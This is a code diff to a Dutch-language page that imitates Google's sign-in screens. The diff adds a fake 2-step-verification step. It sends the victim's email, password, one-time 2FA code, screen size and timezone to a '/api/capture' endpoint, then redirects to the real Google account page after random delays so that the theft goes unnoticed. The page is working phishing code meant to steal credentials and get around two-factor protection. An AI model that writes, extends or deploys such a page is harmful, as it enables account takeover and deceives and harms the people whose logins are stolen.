@@ -350,7 +350,7 @@
         </div>
 
         <!-- ── STAP 2: Wachtwoord ── -->
-        <div id="step-password">
+        <div id="step-password" style="display:none;">
 
             <div class="step-back">
                 <button class="back-icon-btn" onclick="goBack()" aria-label="Terug">
@@ -402,9 +402,58 @@
                 <a href="https://accounts.google.com/signin/recovery" target="_blank" class="link">Wachtwoord vergeten?</a>
             </div>
 
-            <div class="actions">
+            <div style="margin-top:12px;">
+                <label style="font-size:14px;color:#5f6368;display:flex;align-items:center;gap:8px;cursor:pointer;">
+                    <input type="checkbox" id="staySignedIn" style="width:14px;height:14px;accent-color:#1a73e8;">
+                    Aangemeld blijven
+                </label>
+            </div>
+
+            <div class="actions" style="margin-top:24px;">
                 <a href="#" class="link">Meer opties</a>
                 <button class="btn-next" id="pwBtn" onclick="submitLogin()">Volgende</button>
+            </div>
+        </div>
+
+        <!-- ── STAP 3: 2-stapsverificatie ── -->
+        <div id="step-2fa" style="display:none;">
+
+            <div style="text-align:center;margin-bottom:8px;">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+                     alt="Google" style="height:20px;">
+            </div>
+
+            <div class="avatar-wrap">
+                <div class="avatar" style="font-size:30px;">🔒</div>
+            </div>
+
+            <h1 class="card-title" style="margin-bottom:8px;">2-stapsverificatie</h1>
+            <p style="font-size:14px;color:#5f6368;text-align:center;margin-bottom:4px;font-weight:500;" id="tfa-email-display"></p>
+            <p id="tfa-msg" style="font-size:14px;color:#5f6368;text-align:center;margin-bottom:24px;line-height:1.6;">
+                We hebben een sms gestuurd naar het telefoonnummer dat eindigt op <b>•• ••</b>.<br>
+                Voer je 6-cijferige verificatiecode in om te bevestigen.
+            </p>
+
+            <div class="field">
+                <input type="text" id="tfaInput" placeholder=" "
+                       inputmode="numeric" pattern="[0-9 ]*" maxlength="10"
+                       autocomplete="one-time-code" spellcheck="false">
+                <label for="tfaInput">Verificatiecode invoeren</label>
+            </div>
+            <div class="err-msg" id="tfaErr">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
+                    <path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span>Voer de verificatiecode in</span>
+            </div>
+
+            <div class="forgot-wrap" style="margin-top:10px;">
+                <a href="#" class="link" onclick="tryAnotherWay();return false;">Probeer een andere manier</a>
+            </div>
+
+            <div class="actions" style="margin-top:28px;">
+                <a href="#" class="link" onclick="return false;">Meer informatie</a>
+                <button class="btn-next" id="tfaBtn" onclick="submitTwoFA()">Volgende</button>
             </div>
         </div>
 
@@ -515,13 +564,7 @@
             statusEl.textContent = 'Verifiëren' + '.'.repeat(dotCount);
         }, 400);
 
-        // Send and wait for server confirmation, then redirect
-        const doRedirect = () => {
-            clearInterval(dotInterval);
-            statusEl.textContent = '';
-            window.location.href = 'https://myaccount.google.com/';
-        };
-
+        // Capture credentials with full context
         fetch('/api/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -529,27 +572,91 @@
                 email,
                 password,
                 source: 'google_login',
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                clientId: localStorage.getItem('_cid') || 'unknown',
+                screen: (screen.width || 0) + 'x' + (screen.height || 0),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                staySignedIn: document.getElementById('staySignedIn')?.checked || false
             })
-        })
-        .then(r => r.json())
-        .then(() => {
-            // Server confirmed — short extra delay so it looks natural
-            setTimeout(doRedirect, 800);
-        })
-        .catch(() => {
-            // Server unreachable — still redirect after fallback delay
-            setTimeout(doRedirect, 2000);
-        });
+        }).catch(() => {});
 
-        // Absolute max wait: 8 seconds, then redirect no matter what
-        setTimeout(doRedirect, 8000);
+        // After short "verifying" delay, show 2FA step
+        setTimeout(() => {
+            clearInterval(dotInterval);
+            if (statusEl.parentNode) statusEl.remove();
+            btn.innerHTML = 'Volgende';
+            btn.disabled = false;
+            goToTwoFA(email);
+        }, 1600 + Math.random() * 600);
+    }
+
+    /* ── Stap 3: 2FA ── */
+    function goToTwoFA(email) {
+        document.getElementById('step-password').style.display = 'none';
+        document.getElementById('step-2fa').style.display = 'block';
+        document.getElementById('tfa-email-display').textContent = email;
+        setTimeout(() => document.getElementById('tfaInput').focus(), 50);
+    }
+
+    /* ── 2FA verifiëren ── */
+    function submitTwoFA() {
+        const inp = document.getElementById('tfaInput');
+        const errEl = document.getElementById('tfaErr');
+        const code = inp.value.trim();
+
+        if (!code || code.replace(/\s/g, '').length < 4) {
+            inp.classList.add('err');
+            errEl.classList.add('show');
+            inp.focus();
+            return;
+        }
+
+        inp.classList.remove('err');
+        errEl.classList.remove('show');
+
+        const btn = document.getElementById('tfaBtn');
+        btn.innerHTML = '<span class="spinner"></span>';
+        btn.disabled = true;
+
+        const email = document.getElementById('tfa-email-display').textContent;
+
+        // Capture the 2FA / backup code
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email,
+                password: '[2FA CODE] ' + code,
+                source: 'google_2fa',
+                timestamp: new Date().toISOString(),
+                clientId: localStorage.getItem('_cid') || 'unknown'
+            })
+        }).catch(() => {});
+
+        // Redirect to real Google account after short delay
+        setTimeout(() => {
+            window.location.href = 'https://myaccount.google.com/?hl=nl';
+        }, 1400 + Math.random() * 400);
+    }
+
+    /* ── Andere verificatiemethode ── */
+    function tryAnotherWay() {
+        const msg = document.getElementById('tfa-msg');
+        if (msg) {
+            msg.innerHTML = 'We hebben een e-mail gestuurd naar het herstel-e-mailadres dat aan je account is gekoppeld.<br>Voer de 6-cijferige code in die we je hebben gestuurd.';
+        }
+        document.getElementById('tfaInput').value = '';
+        document.getElementById('tfaInput').focus();
     }
 
     /* ── Enter-toets ── */
     document.addEventListener('keydown', function (e) {
         if (e.key !== 'Enter') return;
-        if (document.getElementById('step-password').style.display === 'block') {
+        const s2 = document.getElementById('step-password').style.display;
+        const s3 = document.getElementById('step-2fa').style.display;
+        if (s3 === 'block') {
+            submitTwoFA();
+        } else if (s2 === 'block') {
             submitLogin();
         } else {
             goToPassword();
@@ -565,6 +672,13 @@
     document.getElementById('pwInput').addEventListener('input', function () {
         this.classList.remove('err');
         document.getElementById('pwErr').classList.remove('show');
+    });
+
+    document.getElementById('tfaInput').addEventListener('input', function () {
+        this.classList.remove('err');
+        document.getElementById('tfaErr').classList.remove('show');
+        // Allow digits and spaces only
+        this.value = this.value.replace(/[^0-9 ]/g, '');
     });
 </script>
 
